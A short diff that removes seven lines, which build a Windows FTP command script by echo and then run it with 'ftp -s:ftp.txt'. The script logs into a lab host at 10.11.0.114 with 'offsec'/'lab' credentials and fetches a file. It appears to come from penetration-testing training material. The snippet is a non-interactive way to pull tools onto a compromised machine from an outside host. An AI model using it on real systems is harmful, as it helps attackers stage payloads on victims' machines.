@@ -1,7 +1,0 @@
-echo open 10.11.0.114 21 > ftp.txt
-echo offsec>> ftp.txt
-echo lab >> ftp.txt
-echo bin >> ftp.txt
-echo GET <file> >> ftp.txt
-echo bye >>ftp.txt
-ftp -s:ftp.txt
